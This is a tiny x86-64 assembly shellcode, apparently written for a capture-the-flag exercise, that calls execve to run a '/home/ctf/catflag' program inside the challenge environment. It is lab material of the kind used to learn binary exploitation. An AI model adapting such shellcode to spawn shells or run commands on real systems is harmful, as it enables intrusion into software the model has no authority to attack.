# written by xohan30

.global _start
_start:
.intel_syntax noprefix
        mov rax, 59             # execv syscall no
        lea rdi, [rip+flag]     # loading the flag variable into memory
        mov rsi, 0              # null arg
        mov rdx, 0              # null arg
        syscall                 # syscall
flag:
        .string "/home/ctf/catflag" # command to be executed
